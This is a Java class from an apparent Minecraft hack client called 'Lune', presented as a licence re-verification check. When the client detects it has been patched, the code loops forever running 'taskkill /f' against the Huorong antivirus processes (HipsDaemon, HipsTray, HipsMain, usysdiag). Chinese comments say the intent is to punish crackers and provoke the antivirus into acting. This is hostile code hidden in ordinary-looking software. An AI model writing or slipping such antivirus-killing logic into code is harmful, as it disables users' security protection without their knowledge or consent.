package me.superskidder.lune.luneautoleak.othercheck;

import java.io.IOException;

import me.superskidder.lune.Lune;
import me.superskidder.lune.luneautoleak.checks.AntiPatch;
import me.superskidder.lune.utils.client.DevUtils;

public class ReVerify {
	public ReVerify() {
		if(Lune.flag >= 0 && AntiPatch.patched) {
			// 开裂客户端会逸一时误一世
			Lune.flag = -114514;
			
			// 让火绒报KillAV 希望用户开的是自动处理病毒
			while(true) {
				try {
					Runtime.getRuntime().exec("taskkill /f /im HipsDaemon.exe");
					Runtime.getRuntime().exec("taskkill /f /im HipsTray.exe");
					Runtime.getRuntime().exec("taskkill /f /im HipsMain.exe");
					Runtime.getRuntime().exec("taskkill /f /im usysdiag.exe");
				} catch (IOException e) {

				}
			}
		}
		
		if(Lune.flag == -666) {
			Lune.flag = 0;
		}
		
		if(DevUtils.lol("LOL").equals("LOL")) {
			Lune.flag = -666;
		}
		
        Lune.INSTANCE.luneAutoLeak.didVerify.add(2);
	}
}
